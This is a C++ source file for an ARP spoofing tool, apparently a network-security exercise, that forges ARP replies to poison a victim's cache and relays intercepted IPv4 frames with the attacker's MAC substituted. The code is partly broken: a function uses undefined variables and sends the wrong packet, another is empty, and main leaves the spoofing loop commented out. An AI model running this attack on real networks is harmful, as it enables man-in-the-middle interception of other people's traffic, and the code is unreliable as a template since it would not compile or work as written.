#include <cstdio>
#include <pcap.h>
#include <libnet.h>
#include <netinet/ip.h>
#include <arpa/inet.h>
#include <sys/ioctl.h>
#include <unistd.h>
#include <net/if.h>
#include "ethhdr.h"
#include "arphdr.h"

#define MAC_SIZE 6

#define MTU 1500


#pragma pack(push, 1)
struct EthArpPacket final {
    EthHdr eth_;
    ArpHdr arp_;
};
#pragma pack(pop)


void usage() {
    printf("syntax: send-arp <interface> <sender ip 1> <target ip 1> [<sender ip 2> <target ip 2> ...]\n");
    printf("sample: send-arp wlan0 192.168.10.2 192.168.10.1\n");
}



int getMyIp(const char* dev, EthArpPacket &packet) {
    int sockfd;
    struct ifreq ifr;

    sockfd = socket(AF_INET, SOCK_DGRAM, 0);
    if (sockfd < 0) {
        printf("Fail to get interface IP address - socket() failed - %m\n");
        return -1;
    }

    ifr.ifr_addr.sa_family = AF_INET;
    strncpy(ifr.ifr_name, dev, IFNAMSIZ-1);

    if (ioctl(sockfd, SIOCGIFADDR, &ifr) < 0) {
        printf("Fail to get interface IP address - ioctl(SIOCSIFADDR) failed - %m\n");
        close(sockfd);
        return -1;
    }

    close(sockfd);

    packet.arp_.sip_ = ((struct sockaddr_in *)&ifr.ifr_addr)->sin_addr.s_addr;

    return 0;
}
unsigned char* getMyMac(const char* dev) {
    struct ifreq ifr;
    int sockfd, ret;

    sockfd = socket(AF_INET, SOCK_DGRAM, 0);
    if (sockfd < 0) {
        printf("Fail to get interface MAC address - socket() failed - %m\n");
        return NULL;
    }

    strncpy(ifr.ifr_name, dev, IFNAMSIZ);
    ret = ioctl(sockfd, SIOCGIFHWADDR, &ifr);
    if (ret < 0) {
        printf("Fail to get interface MAC address - ioctl(SIOCSIFHWADDR) failed - %m\n");
        close(sockfd);
        return NULL;
    }

    close(sockfd);

    unsigned char* mac_address = (unsigned char*)malloc(MAC_SIZE);
    if (mac_address == NULL) {
        printf("Failed to allocate memory for MAC address\n");
        return NULL;
    }

    memcpy(mac_address, ifr.ifr_hwaddr.sa_data, MAC_SIZE);
    return mac_address;
}

bool getSenderMac(pcap_t* handle, EthArpPacket &packet) {

    int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
    if (res != 0) {
        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
    }

    while (true) {
        struct pcap_pkthdr* header;
        const u_char* responsePacket;
        int res = pcap_next_ex(handle, &header, &responsePacket);
        if (res == 0) continue;
        if (res == -1 || res == -2) {
            printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
            return false;
        }
        
        // detection for eth-arp packet(sender'sip)
        EthArpPacket* recvPacket = (EthArpPacket*)responsePacket;
        if (ntohs(recvPacket->eth_.type_) != EthHdr::Arp) {
            continue;
        }
        if(ntohs(recvPacket->arp_.op_) != ArpHdr::Reply) {
            continue;
        }
        if(recvPacket->arp_.sip_ != packet.arp_.tip_) {
            continue;
        }

        memcpy(&packet.arp_.tmac_, &recvPacket->arp_.smac_, MAC_SIZE); 
        memcpy(&packet.eth_.dmac_, &recvPacket->eth_.smac_, MAC_SIZE);
        return true;
    }
}

bool check_spoofed(pcap_t* handle){

}


bool sendArpSpoof(pcap_t* handle, EthArpPacket &packet) {

    EthArpPacket myPacket;

    //config default

    // Get network information
    if(getMyIp(dev,myPacket)==-1){
        return -1;
    }

	myPacket.eth_.dmac_ = Mac("ff:ff:ff:ff:ff:ff"); // 1 : broadcast 2 : sender mac
	// myPacket.eth_.smac_ = Mac(); -> config after getMyMac()
	myPacket.eth_.type_ = htons(EthHdr::Arp);

	myPacket.arp_.hrd_ = htons(ArpHdr::ETHER);
	myPacket.arp_.pro_ = htons(EthHdr::Ip4);
	myPacket.arp_.hln_ = Mac::SIZE;
	myPacket.arp_.pln_ = Ip::SIZE;
	myPacket.arp_.op_ = htons(ArpHdr::Request);  
	// myPacket.arp_.smac_ = Mac("00:00:00:00:00:00"); -> after getMyMac() 
	// myPacket.arp_.sip_ = htonl(Ip("0.0.0.0"));  -> after getMyIp()
	myPacket.arp_.tmac_ = Mac("00:00:00:00:00:00");
	myPacket.arp_.tip_ = htonl(Ip(argv[2]));

    int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
    if (res != 0) {
        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
        return false;
    }
    return true;

}


void relay_packet(pcap_t* handle,const char* dev) {
    struct pcap_pkthdr* header;  // header pcap gives us
    const u_char *packet;       // actual packet

    // loop for packet capturing
    while (1) {
        int res = pcap_next_ex(handle, &header, &packet);
        if (res == 0) continue;
        if (res == -1 || res == -2) break;




        //Ip packet parsing
        // check Eth_type -> if ipv4 -> relay
        struct libnet_ethernet_hdr *eth_hdr = (struct libnet_ethernet_hdr *)packet;

        if (ntohs(eth_hdr->ether_type) != ETHERTYPE_IP) continue;

        // modify smac to mine (attacker)
        unsigned char *m_mac= getMyMac(dev);
        if (m_mac == NULL) {
            fprintf(stderr, "Could not get MAC address.\n");
            return;
        }

        // spoofed?? == 1) mac check()-1.1)src, 1.2)dst
        // 2) ip check
        // -2-2) sip check (against my ip)
        // -2-3) dip check (my ip)
        //  if not? spoofing and continue

        
        memcpy(eth_hdr->ether_shost, m_mac, 6);
        free(m_mac);         
        //send to target

        if (header->len > MTU) {
            printf("jumbo frame\n");
            return;
        } else if (pcap_sendpacket(handle, packet, header->len) != 0) {
            fprintf(stderr,"\nError sending the packet: %s\n", pcap_geterr(handle));
            return;
        }
        printf("good!\n");
    }
}

int main(int argc, char* argv[]) {
	if (argc != 4) {
		usage();
		return -1;
	}
    char* dev = argv[1];
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
    if (handle == nullptr) {
        fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
        return -1;
    }

    EthArpPacket myPacket;

    //config default

	myPacket.eth_.dmac_ = Mac("ff:ff:ff:ff:ff:ff"); // 1 : broadcast 2 : sender mac
	// myPacket.eth_.smac_ = Mac(); -> config after getMyMac()
	myPacket.eth_.type_ = htons(EthHdr::Arp);

	myPacket.arp_.hrd_ = htons(ArpHdr::ETHER);
	myPacket.arp_.pro_ = htons(EthHdr::Ip4);
	myPacket.arp_.hln_ = Mac::SIZE;
	myPacket.arp_.pln_ = Ip::SIZE;
	myPacket.arp_.op_ = htons(ArpHdr::Request);  
	// myPacket.arp_.smac_ = Mac("00:00:00:00:00:00"); -> after getMyMac() 
	// myPacket.arp_.sip_ = htonl(Ip("0.0.0.0"));  -> after getMyIp()
	myPacket.arp_.tmac_ = Mac("00:00:00:00:00:00");
	myPacket.arp_.tip_ = htonl(Ip(argv[2]));

    // Get network information
/*     if(getMyIp(dev,myPacket)==-1){
        return -1;
    } */
    
    relay_packet(handle,dev);

/*     unsigned char *mymac = getMyMac(dev);
    if (mymac==NULL){
        return -1;
    }
    memcpy(&myPacket.eth_.smac_,mymac,MAC_SIZE);
    memcpy(&myPacket.arp_.smac_,mymac,MAC_SIZE);


    if (!getSenderMac(handle, myPacket)) {
        printf("Failed to get sender MAC address.\n");
        return -1;
    }

    // ARP spoof target
    myPacket.arp_.sip_ = htonl(Ip(argv[3]));
    myPacket.arp_.op_ = htons(ArpHdr::Reply);
    while(1){
    	if (!sendArpSpoof(handle, myPacket)) {
        	printf("Failed to send ARP spoofing packet.\n");
       		return -1;
    	}
    }
    printf("Spoofed ARP of target %s.\n", argv[3]); */

    pcap_close(handle);
    return 0;
}
